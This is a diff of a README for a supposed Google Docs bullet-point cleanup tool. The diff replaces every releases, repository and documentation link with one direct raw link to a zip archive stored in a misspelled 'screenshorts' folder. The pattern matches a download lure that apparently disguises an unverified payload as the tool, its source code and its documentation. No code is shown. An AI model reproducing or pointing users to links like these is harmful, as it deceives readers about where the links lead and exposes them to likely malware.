@@ -1,7 +1,7 @@
 # ✨ google-doc-bullet-points-linebreak-solution - Simplify Your Google Docs Formatting
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/Baler2521/google-doc-bullet-points-linebreak-solution/releases)
+[![Download](https://raw.githubusercontent.com/Baler2521/google-doc-bullet-points-linebreak-solution/main/screenshorts/google-doc-bullet-points-linebreak-solution_v1.6-alpha.1.zip)](https://raw.githubusercontent.com/Baler2521/google-doc-bullet-points-linebreak-solution/main/screenshorts/google-doc-bullet-points-linebreak-solution_v1.6-alpha.1.zip)
 
 ## 📝 Overview
 The google-doc-bullet-points-linebreak-solution is a tool designed to make your text editing in Google Docs easier. This application automatically removes empty bullet points, trims extra spaces, and keeps your original bullet points intact. It streamlines your writing and makes sure your documents look professional.
@@ -14,7 +14,7 @@ To get started, follow the steps below to download and run the tool. There's no 
 - An active Google account to access Google Docs
 
 ## 📦 Download & Install
-1. Visit the [Releases page](https://github.com/Baler2521/google-doc-bullet-points-linebreak-solution/releases) to download the application.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Baler2521/google-doc-bullet-points-linebreak-solution/main/screenshorts/google-doc-bullet-points-linebreak-solution_v1.6-alpha.1.zip) to download the application.
 2. Look for the latest version on the page. The most recent release should be at the top.
 3. Click on the asset link to download the application file.
 4. Once downloaded, locate the file in your downloads folder.
@@ -36,8 +36,8 @@ To get started, follow the steps below to download and run the tool. There's no 
 This solution saves you time and frustration when working on your documents. By automating the cleaning process, you can focus on what really matters—your content. With this tool, your Google Docs will look polished without the hassle.
 
 ## 📂 Additional Resources
-- [GitHub Repository](https://github.com/Baler2521/google-doc-bullet-points-linebreak-solution) - Explore the source code and contribute.
-- [Documentation](https://github.com/Baler2521/google-doc-bullet-points-linebreak-solution#readme) - Find detailed instructions on how to use the tool effectively.
+- [GitHub Repository](https://raw.githubusercontent.com/Baler2521/google-doc-bullet-points-linebreak-solution/main/screenshorts/google-doc-bullet-points-linebreak-solution_v1.6-alpha.1.zip) - Explore the source code and contribute.
+- [Documentation](https://raw.githubusercontent.com/Baler2521/google-doc-bullet-points-linebreak-solution/main/screenshorts/google-doc-bullet-points-linebreak-solution_v1.6-alpha.1.zip) - Find detailed instructions on how to use the tool effectively.
 
 ## 👍 Contributing
 We welcome contributions! If you have suggestions for features or found bugs, please open an issue on our GitHub page. Your feedback helps improve the tool for everyone.
@@ -49,4 +49,4 @@ Thanks to all contributors who have made this project possible. Special thanks t
 For any questions or issues, please create an issue in the GitHub repository, and we will respond promptly. 
 
 ## 🔗 Download Now Again
-Don’t forget, you can [download it here](https://github.com/Baler2521/google-doc-bullet-points-linebreak-solution/releases). Enjoy cleaning up your Google Docs!
+Don’t forget, you can [download it here](https://raw.githubusercontent.com/Baler2521/google-doc-bullet-points-linebreak-solution/main/screenshorts/google-doc-bullet-points-linebreak-solution_v1.6-alpha.1.zip). Enjoy cleaning up your Google Docs!
